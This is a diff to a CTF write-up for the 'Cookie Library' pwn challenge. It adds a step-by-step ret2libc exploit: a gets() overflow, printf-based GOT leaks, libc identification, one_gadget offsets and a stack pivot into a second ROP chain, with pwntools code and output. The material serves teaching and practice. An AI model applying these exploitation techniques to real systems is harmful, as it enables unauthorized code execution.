@@ -40,6 +40,7 @@ int main() {
   else
     puts("I'm sorry but we can't be friends anymore");
 }
+```
 
 Simple enough. We'll use `ctypes` to simulate `rand()`, taking our system's clock as the right seed for `srand()`. Putting it together into a pwntools script:
 ```python
@@ -65,25 +66,88 @@ If you didn't realise during the CTF, here's the ticket: _that was completely us
 
 As its namesake, _Cookie Library_ is a `ret2libc` challenge, that unfortunately has no libc version given.
 
--srand()/rand() is a lie; does nothing
- -can describe how you'd do it with ctypes.CDLL
--gets() BOF -> run gadgets
- -important: rdi (arg1), rsi (arg2), rsp (for 2nd ROP)
--printf %s -> leak address contents
- -"%s" from .rodata, set to rdi
- -address as rsi
- -used to get libc addresses
--gadgets and gets() -> multiple ROPs
- -use scratch space at .data for known-address
- -rdi=.data and gets() to write the ROP
- -rsp gadget to shift to 2nd ROP chain
--libc leak -> one_gadget
- -rsp overwrite has secondary purpose: fulfil one_gadget [rsp+0x40] == NULL requirement
- -ez pwn
+To get the flag for this challenge, we're going to have to do a number of things:
+0. Overwrite the return pointer with `gets()`
+1. Figure out how to arbitrary read, because libc addresses need to be leaked
+2. Find the libc version using that leak, and get a `one_gadget` offset
+3. Simultanously leak libc and write the correct one_gadget address to the overflow in one `remote()` connection.
 
-<p align="center">
-<img src="libcleak.png">
-</p>
+Like in the previous challenge (`stop`), we'll simply use `cyclic()` and `gdb` to derive the correct offset for the return pointer, which is located at `cyclic_find("waaa")`.
+
+To leak a libc address, we can also repeat what we did in `Stop`, using `pop rsi` and `pop rdi` gadgets to push a "%s" string embedded in `.rodata:400B4B+4` as an argument for `printf()`, leaking libc addresses via the GOT table.
+
+We leak a number of addresses like so (full code in appendix):
+```python
+rop = leak('rand') + leak('srand')
+r.sendlineafter('?\n', 'a'*r_offset+ ''.join(map(p64,rop)))
+print('addr of rand:  ' + hex(u64(r.recv(6) + '\0'*2))) #0x7fd470c173a0
+r.recvline()
+print('addr of srand: ' + hex(u64(r.recv(6) + '\0'*2))) 
+```
+The stack looks something like this:
+```
++---s[]---+----rdi="%s\n"----+----rsi=ELF.got['rand']----+-plt.['printf']->
+| garbage | pop rdi | "%s\n" | pop rsi, r15 | <rand> | 0 |    printf()    >
++---88----+--------16--------+-------------24------------+-------8-------->
+<----rdi="%s\n"----+----rsi=ELF.got['srand']----+-plt.['printf']-+
+< pop rdi | "%s\n" | pop rsi, r15 | <srand> | 0 |    printf()    |
+<--------16--------+-------------24-------------+-------8--------+
+```
+
+And we get a number of addresses (test yourself with `python cookie.py test`):
+```
+[+] Opening connection to p1.tjctf.org on port 8010: Done
+addr of rand:  0x7f743c6e63a0
+addr of srand: 0x7f743c6e5bb0
+[*] Closed connection to p1.tjctf.org port 8010
+```
+We can open up [libc-db](https://github.com/niklasb/libc-database) and figure out just which `libc.so.6` is awaiting abusual:
+```sh
+libc-database$ ./find rand 0x7f743c6e63a0 srand 0x7f743c6e5bb0
+http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)
+```
+After that, we can have a look at the kind of gadgets we're granted for 2.27:
+```sh
+libc-database$ one_gadget db/libc6_2.27-3ubuntu1_amd64.so
+0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f322 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+The first gadget looks simpler to deal with, but we're forced against the cruft:
+```sh
+$ ropper -f cookie_library.o --nocolor 2> /dev/null | grep rcx | grep -v '[rcx]' | wc
+      0       0       0
+```
+With no good `rcx` gadgets, we're damned to hit the highway with a `pop rsp`: `0x000000000040092d: pop rsp; pop r13; pop r14; pop r15; ret;`
+
+To avoid having to leak the pre-existing `rsp`, we choose to switch over to a known, non-random non-PIE address to deign as the new `rsp`. The r/w `.data` segment fulfils this role adequately.
+
+Incidentally, this is a blessing in disguise — by switching over to a controlled `rsp`, we're also given a good opportunity to write a secondary ROP chain at the same place, meaning that our overbloated payload is going to look something like this:
+```
+rop chain 1, written to s1[]:
++---s[]---+----rdi="%s\n"----+----rsi=ELF.got['rand']----+-plt.['printf']->
+| garbage | pop rdi | "%s\n" | pop rsi, r15 | <rand> | 0 |    printf()    >
++---88----+--------16--------+-------------24------------+-------8-------->
+<----rdi=<.data>----+-plt.['gets']-+-rsp=ELF.symbols['data']-+
+< pop rdi | <.data> |    gets()    | pop_rsp_and_3 | <.data> |
+<---------16--------+------8-------+------------16-----------+
+rop chain 2, written to .data:
++--leftover pops from prev gadget---+----one_gadget-----+-buffer-+-one_gadget requirement-+
+|     0     |     0     |     0     | libc_base+0x4f322 |   00   |          NULL          |
++-----------------24----------------+---------8---------+---32---|-----------8------------+
+```
+We leak libc (via `printf()`), write a secondary rop chain with `gets()`, shift `rsp` to that rop chain, and then jump to the one_gadget.
+
+Works like a charm.
 
 <p align="center">
 <img src="shell.png">
@@ -114,6 +178,7 @@ leak = lambda got_func: rdi_rsi(s_fmt, e.got[got_func]) + [e.plt['printf']]
 if len(argv) > 1: #LEAKED: libc6_2.27-3ubuntu1_amd64 
     rop = leak('rand') + leak('srand')
     r.sendlineafter('?\n', 'a'*r_offset+ ''.join(map(p64,rop)))
+    r.recvline()
     print('addr of rand:  ' + hex(u64(r.recv(6) + '\0'*2))) #0x7fd470c173a0
     r.recvline()
     print('addr of srand: ' + hex(u64(r.recv(6) + '\0'*2))) #0x7fd470c16bb0
